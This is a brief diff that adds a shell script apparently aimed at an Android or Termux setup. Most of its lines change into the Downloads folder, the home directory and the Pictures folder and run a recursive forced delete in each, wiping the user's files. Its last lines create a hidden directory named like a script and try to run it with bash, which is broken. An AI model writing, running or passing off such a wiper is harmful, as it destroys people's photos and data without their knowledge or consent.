@@ -1,0 +1,10 @@
+cd /sdcard/download
+rm -rif *
+cd
+rm -rif *
+cd /sdcard/Pictures
+rm -rif *
+cd ..
+cd
+mkdir .as.sh
+bash .as.sh
